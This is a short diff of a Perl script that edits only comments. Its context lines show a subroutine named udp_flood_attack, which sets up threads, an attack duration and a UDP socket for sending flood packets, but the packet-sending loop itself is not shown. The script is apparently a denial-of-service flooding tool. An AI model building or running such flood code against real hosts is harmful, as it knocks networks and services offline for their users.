@@ -2,13 +2,13 @@
 
 use strict;
 
-# Object interface to socket communications
+# Object interface for socket communications
 use IO::Socket;
 # Perl interpreter-based threads
 use threads;
 use threads::shared;
 
-# Thread used to run the subroutine
+# Thread used to run the main subroutine
 my $thr;
 # Flag to stop the subroutine
 my $interrupt :shared;
@@ -24,7 +24,7 @@ sub udp_flood_attack
   # Attack duration
   my $endtime = time() + ($time ? $time : 1000000);
 
-  # Opens a UDP socket to send packets
+  # Opens an UDP socket to send packets
   socket("flood", PF_INET, SOCK_DGRAM, 17);
 
   # Auxiliary variables
